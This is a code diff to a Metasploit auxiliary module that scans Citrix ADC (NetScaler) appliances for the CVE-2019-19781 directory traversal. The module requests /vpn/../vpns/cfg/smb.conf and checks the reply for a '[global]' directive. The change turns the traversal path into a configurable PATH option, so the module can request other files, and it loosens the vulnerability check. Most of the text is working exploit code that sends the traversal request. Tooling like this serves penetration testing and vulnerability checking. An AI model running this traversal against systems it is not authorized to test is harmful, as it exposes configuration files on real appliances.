@@ -16,7 +16,7 @@ class MetasploitModule < Msf::Auxiliary
         This module exploits a directory traversal vulnerability (CVE-2019-19781) within Citrix ADC
         (NetScaler). It requests the smb.conf file located in the /vpns/cfg directory by issuing the request
         /vpn/../vpns/cfg/smb.conf. It then checks if the server is vulnerable by looking for the presence of
-        a "global" variable in smb.conf, which this file should always contain.
+        a "[global]" directive in smb.conf, which this file should always contain.
       },
       'Author'         => [
         'Erik Wynter',
@@ -27,16 +27,20 @@ class MetasploitModule < Msf::Auxiliary
         ['URL', 'https://support.citrix.com/article/CTX267027/']
       ],
       'DisclosureDate' => '2019-12-17',
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'Notes'          => {
+        'AKA'          => ['Shitrix']
+      }
     ))
 
     register_options([
-      OptString.new('TARGETURI', [true, 'Base path', '/'])
+      OptString.new('TARGETURI', [true, 'Base path', '/']),
+      OptString.new('PATH',      [true, 'Traversal path', '/vpn/../vpns/cfg/smb.conf'])
     ])
   end
 
   def run_host(target_host)
-    turi = normalize_uri(target_uri.path, '/vpn/../vpns/cfg/smb.conf')
+    turi = normalize_uri(target_uri.path, datastore['PATH'])
 
     res = send_request_raw(
       'method' => 'GET',
@@ -49,16 +53,23 @@ class MetasploitModule < Msf::Auxiliary
       return Exploit::CheckCode::Unknown
     end
 
-    unless res.code == 200 && res.body.include?('global')
+    unless res.code == 200
       print_error("#{full_uri(turi)} - The target is not vulnerable to CVE-2019-19781.")
-      vprint_error("Obtained HTTP response code #{res.code} not including \"global\" for #{full_uri(turi)}.")
+      vprint_error("Obtained HTTP response code #{res.code} for #{full_uri(turi)}.")
 
       return Exploit::CheckCode::Safe
     end
 
+    case turi
+    when /smb\.conf$/
+      unless res.headers['Content-Type'].starts_with?('text/plain') && res.body.include?('[global]')
+        vprint_warning("#{turi} does not contain \"[global]\" directive.")
+      end
+    end
+
     print_good("#{full_uri(turi)} - The target is vulnerable to CVE-2019-19781.")
-    msg = "Obtained HTTP response code #{res.code} including \"global\" for #{full_uri(turi)}. " \
-          'This means that access to /vpns/cfg/smb.conf was obtained via directory traversal.'
+    msg = "Obtained HTTP response code #{res.code} for #{full_uri(turi)}. " \
+          "This means that access to #{turi} was obtained via directory traversal."
     vprint_good(msg)
 
     report_vuln(
